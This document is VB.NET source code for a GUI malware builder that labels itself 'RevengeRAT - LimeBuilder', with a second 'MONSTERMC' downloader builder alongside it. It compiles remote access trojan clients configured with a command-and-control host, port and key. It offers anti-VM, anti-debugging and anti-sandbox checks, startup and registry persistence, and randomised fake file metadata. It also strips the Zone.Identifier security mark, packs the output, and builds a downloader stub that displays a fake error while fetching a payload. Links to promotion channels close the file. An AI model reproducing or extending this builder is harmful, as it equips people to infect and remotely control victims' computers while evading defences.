Imports System.IO
Imports System.Text
Imports System.Threading
Imports System.Environment

Public Class Form1
    Const SiplitTehShitz = "SplitingdataYES!!"
    Dim stub, Title, msg, DownloadUrl As String
    Dim fakeerrorcheckbox As Boolean
    Private Function III(ByVal name As String) As String
        Return Convert.ToBase64String(Encoding.UTF8.GetBytes(name))
    End Function
    Private Sub btn_OK_Click(sender As Object, e As EventArgs) Handles btn_OK.Click

        Dim I As New SaveFileDialog

        I.Title = "Save File"

        I.Filter = "Executable(*.exe)|*.exe|All Files (*.*)|*.*"

        If I.ShowDialog = DialogResult.OK Then

            Dim Y As String = "|ST|"

            Dim Stub As String

            FileOpen(1, "Stub.dll", OpenMode.Binary, OpenAccess.Read, OpenShare.Default)

            Stub = Space(LOF(1))

            FileGet(1, Stub)

            FileClose(1)

            '|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

            FileOpen(1, I.FileName, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)

            FilePut(1, Stub & Y & III(vt_txt.Text) & Y & TXT_Host.Text & Y & nd_port.Value & Y & CK_Copy.Checked.ToString & Y & process_txt.Text & Y & CB_Directory.Text & Y & CK_Msgbox.Checked.ToString & Y & title_text.Text & Y & message_text.Text & Y & CK_ProtectProcess.Checked.ToString & Y & CK_CopyStartUp.Checked.ToString & Y & CK_RegistryStartUp.Checked.ToString & Y)

            FileClose(1)
            If Me.CKUpx.Checked Then
                Application.DoEvents()
                If Not Directory.Exists((Application.StartupPath & "\UPX")) Then
                    Directory.CreateDirectory((Application.StartupPath & "\UPX"))
                End If
                Thread.Sleep(50)
                If Not File.Exists((Application.StartupPath & "\UPX\mpress.exe")) Then
                    Dim mpress As Byte() = My.Resources.mpress
                    File.WriteAllBytes((Application.StartupPath & "\UPX\mpress.exe"), mpress)
                End If
                Thread.Sleep(50)
                Shell(("cmd.exe /C UPX\mpress.exe -s """ & I.FileName & """"), AppWinStyle.NormalFocus, True, -1)
            End If
            MsgBox("File Builded To" & vbNewLine & I.FileName, MsgBoxStyle.Information, "DONE!")
        End If
    End Sub
    Private Sub CK_Msgbox_CheckedChanged(sender As Object) Handles CK_Msgbox.CheckedChanged
        If CK_Msgbox.Checked = True Then
            GB_Message.Enabled = True
        Else
            GB_Message.Enabled = False
        End If
    End Sub

    Private Sub CK_Copy_CheckedChanged(sender As Object) Handles CK_Copy.CheckedChanged
        If CK_Copy.Checked = True Then
            GB_DER.Enabled = True
        Else
            GB_DER.Enabled = False
        End If
    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        For Each typeSpecialFolder In Environment.SpecialFolder.GetValues(GetType(Environment.SpecialFolder))
            ComboFolder.Items.Add(typeSpecialFolder)
            If typeSpecialFolder.ToString = "ApplicationData" Then
                ComboFolder.Text = "ApplicationData"
            End If
        Next
        CB_Directory.SelectedIndex = 0
        System.IO.File.WriteAllBytes("MONSTERMC.dll", My.Resources.MONSTERMC)
        System.IO.File.WriteAllBytes("Stub.dll", My.Resources.Stub)
    End Sub
    Private Sub Chk_INS_CheckedChanged(sender As Object) Handles Chk_INS.CheckedChanged
        If Chk_INS.Checked Then
            Chk_INS.Text = "ON"
            txtFileName.Enabled = True
            ComboFolder.Enabled = True
        Else
            chk_Icon.Text = "OFF"
            txtFileName.Enabled = False
            ComboFolder.Enabled = False
        End If
    End Sub
    Private Sub chk_Icon_CheckedChanged(sender As Object) Handles chk_Icon.CheckedChanged
        If chk_Icon.Checked Then
            chk_Icon.Text = "ON"
        Else
            chk_Icon.Text = "OFF"
            PictureBox1.Image = My.Resources._me
        End If

        If chk_Icon.Text = "ON" Then
            Try
                Dim o As New OpenFileDialog
                With o
                    .Filter = "*.ico (*.ico)| *.ico"
                    .InitialDirectory = Application.StartupPath
                    .Title = "Select Icon"
                End With

                If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                    PictureBox1.ImageLocation = o.FileName
                Else
                    chk_Icon.Text = "OFF"
                    chk_Icon.Checked = False
                    PictureBox1.Image = My.Resources._me
                End If
            Catch ex As Exception
                MsgBox(ex.Message, MsgBoxStyle.Exclamation)
            End Try
        End If
    End Sub
    Private Sub HuraButton1_Click(sender As Object, e As EventArgs) Handles HuraButton1.Click
        Dim Client = My.Resources.Client

        Try
            Dim o As New SaveFileDialog With {
            .Filter = ".exe (*.exe)|*.exe",
            .InitialDirectory = Application.StartupPath,
            .Title = "RevengeRAT - LimeBuilder",
            .OverwritePrompt = False,
            .FileName = "REV-Client"
            }
            If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                Client = Replace(Client, "%HOSTS%", txtHOST.Text.Trim)
                Client = Replace(Client, "%PORT%", txtPORT.Text.Trim)
                Client = Replace(Client, "%KEY%", txtKEY.Text)

                Client = Replace(Client, "%Title%", Randomi(rand.Next(3, 6)) + " " + Randomi(rand.Next(3, 10)))
                Client = Replace(Client, "%Description%", Randomi(rand.Next(3, 6)) + " " + Randomi(rand.Next(3, 10)))
                Client = Replace(Client, "%Company%", Randomi(rand.Next(3, 6)) + " " + Randomi(rand.Next(3, 10)))
                Client = Replace(Client, "%Product%", Randomi(rand.Next(3, 6)) + " " + Randomi(rand.Next(3, 10)))
                Client = Replace(Client, "%Copyright%", Randomi(rand.Next(3, 6)) + " © " + Randomi(rand.Next(3, 10)))
                Client = Replace(Client, "%Trademark%", Randomi(rand.Next(3, 6)) + " " + Randomi(rand.Next(3, 10)))
                Client = Replace(Client, "%v1%", rand.Next(0, 10))
                Client = Replace(Client, "%v2%", rand.Next(0, 10))
                Client = Replace(Client, "%v3%", rand.Next(0, 10))
                Client = Replace(Client, "%v4%", rand.Next(0, 10))
                Client = Replace(Client, "%Guid%", Guid.NewGuid.ToString)


                If Chk_INS.Checked Then
                    If Not txtFileName.Text.EndsWith(".exe") Then
                        txtFileName.Text = txtFileName.Text + ".exe"
                    End If
                    Client = Replace(Client, "%EXE%", txtFileName.Text)
                    Client = Replace(Client, "%DIR%", ComboFolder.Text)
                    Client = Replace(Client, "#Const INS = False", "#Const INS = True")
                End If

                Client = Replace(Client, "#Const VM = False", "#Const VM = " + chkVM.Checked.ToString)
                Client = Replace(Client, "#Const DBG = False", "#Const DBG = " + chkDEBG.Checked.ToString)
                Client = Replace(Client, "#Const SND = False", "#Const SND = " + chkSAND.Checked.ToString)
                Client = Replace(Client, "#Const ZONE = False", "#Const ZONE = " + chkZONE.Checked.ToString)


                Dim providerOptions = New Dictionary(Of String, String)
                providerOptions.Add("CompilerVersion", "v4.0")
                Dim CodeProvider As New VBCodeProvider(providerOptions)
                Dim Parameters As New CodeDom.Compiler.CompilerParameters
                Dim OP As String = " /target:winexe /platform:x86 /optimize+ /nowarn"
                With Parameters
                    .GenerateExecutable = True
                    .OutputAssembly = o.FileName
                    .CompilerOptions = OP
                    .IncludeDebugInformation = False
                    .ReferencedAssemblies.Add("System.Windows.Forms.dll")
                    .ReferencedAssemblies.Add("System.dll")
                    .ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
                    .ReferencedAssemblies.Add("System.Management.dll")
                    .ReferencedAssemblies.Add("System.Drawing.dll")


                    Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, Client)
                    For Each uii As CodeDom.Compiler.CompilerError In Results.Errors
                        MsgBox(uii.ToString)
                        Exit Sub
                    Next

                    If PictureBox1.ImageLocation <> Nothing Then
                        IconChanger.InjectIcon(o.FileName, PictureBox1.ImageLocation)
                    End If

                    If chkZONE.Checked Then
                        DeleteZoneIdentifier(o.FileName)
                    End If

                    MessageBox.Show(o.FileName, "Done!", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1)

                End With
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
        End Try
    End Sub
    Public rand As New Random()
    Function Randomi(ByVal lenght As Integer) As String
        Dim Chr As String = "顾氏家族的成泽是顾商城公司的首席执行官顾太太希望她的生物孙"
        Dim sb As New Text.StringBuilder()
        For i As Integer = 1 To lenght
            Dim idx As Integer = New Random().Next(0, Chr.Length)
            sb.Append(Chr.Substring(idx, 1))
        Next
        Return sb.ToString
    End Function
    <Runtime.InteropServices.DllImport("kernel32.dll", CharSet:=Runtime.InteropServices.CharSet.Auto, BestFitMapping:=False, ThrowOnUnmappableChar:=True, SetLastError:=True)>
    Shared Function DeleteFile(<Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.LPTStr)> ByVal filepath As String
        ) As <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> Boolean
    End Function
    Sub DeleteZoneIdentifier(ByVal filePath As String)
        Try : DeleteFile(filePath + ":Zone.Identifier") : Catch : End Try
    End Sub

    Private Sub HuraControlBox1_Click(sender As Object, e As EventArgs) Handles HuraControlBox1.Click
        End
    End Sub
    '================================================================================= FAKE MSG
    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TestMessage.Click
        MessageBox.Show(txtmsg.Text, txttitle.Text, MessageBoxButtons.OK, MessageBoxIcon.Error)
    End Sub
    Private Sub CheckBox1_CheckedChanged(sender As Object) Handles FakeError.CheckedChanged
        If FakeError.Checked = True Then
            HuraGroupBox6.Enabled = True
        Else
            HuraGroupBox6.Enabled = False
        End If
    End Sub
    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles frmMain.Click
        If FakeError.Checked = True And txtmsg.Text = "" Or txttitle.Text = "" Then
            MessageBox.Show("Please type in some text for fake error first.", "", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Exit Sub
        End If

        If txturl.Text = "" Then
            MessageBox.Show("Please type in download url first.", "", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Exit Sub
        End If

        Title = txttitle.Text
        msg = txtmsg.Text
        DownloadUrl = txturl.Text
        If FakeError.Checked = True Then
            fakeerrorcheckbox = True
        Else : fakeerrorcheckbox = False
        End If

        Dim saveit As New SaveFileDialog
        saveit.Filter = "Output save |*.exe"
        If saveit.ShowDialog = Windows.Forms.DialogResult.OK Then
            FileOpen(1, Application.StartupPath & "\MONSTERMC.Dll", OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
            stub = Space(LOF(1))
            FileGet(1, stub)
            FileClose(1)
            FileOpen(1, saveit.FileName, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
            FilePut(1, stub & SiplitTehShitz & Title & SiplitTehShitz & msg & SiplitTehShitz & DownloadUrl & SiplitTehShitz & fakeerrorcheckbox)
            FileClose(1)
        Else
            Exit Sub
        End If

        MsgBox("Compiled successfully.", MsgBoxStyle.Information, "")
    End Sub
    Private Sub PictureBox2_Click(sender As Object, e As EventArgs) Handles PictureBox2.Click
        Process.Start("https://t.me/MONSTERMCSY")
    End Sub

    Private Sub PictureBox3_Click(sender As Object, e As EventArgs) Handles PictureBox3.Click
        Process.Start("https://www.youtube.com/channel/UCLF-eRNc52VslhdctpHaAzg/videos")
    End Sub

    Private Sub PictureBox4_Click(sender As Object, e As EventArgs) Handles PictureBox4.Click
        Process.Start("https://magholarabeee.blogspot.com/")
    End Sub

    Private Sub PictureBox8_Click(sender As Object, e As EventArgs) Handles PictureBox8.Click
        Process.Start("https://chat.whatsapp.com/FKXgzwZdNLa4WORkLHhubW")
    End Sub

    Private Sub PictureBox6_Click(sender As Object, e As EventArgs) Handles PictureBox6.Click
        MsgBox("VB.NET")
    End Sub

    Private Sub PictureBox7_Click(sender As Object, e As EventArgs) Handles PictureBox7.Click
        Process.Start("https://magholarabeee.blogspot.com/2021/12/blog-post.html")
        Process.Start("https://youtu.be/vJ-nBiPgz9c")
    End Sub

    Private Sub PictureBox5_Click(sender As Object, e As EventArgs) Handles PictureBox5.Click
        Process.Start("https://discord.gg/jQfEDyC3dy")
    End Sub
End Class
